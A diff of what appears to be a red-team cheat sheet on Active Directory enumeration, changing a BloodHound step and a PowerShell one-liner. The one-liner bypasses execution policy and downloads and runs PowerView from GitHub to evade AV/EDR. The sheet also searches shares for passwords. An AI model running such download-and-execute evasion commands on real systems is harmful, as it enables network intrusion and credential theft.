@@ -26,7 +26,7 @@ Import-Module .\Neo4j-Management.psd1
 Invoke-Neo4j console
 ```
 
-Then execute BloodHound.exe and import the zip file.
+Then execute BloodHound and import the zip file.
 
 
 ### Shares :
@@ -45,7 +45,7 @@ grep -rnw ./ -e ‘password’
 If CME is detected by AV/EDR, use PowerShell one-liner PowerView :
 
 ```markdown
-powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
 ```
 
 Then, a lot of functionalities can be used. To find all domain shares :
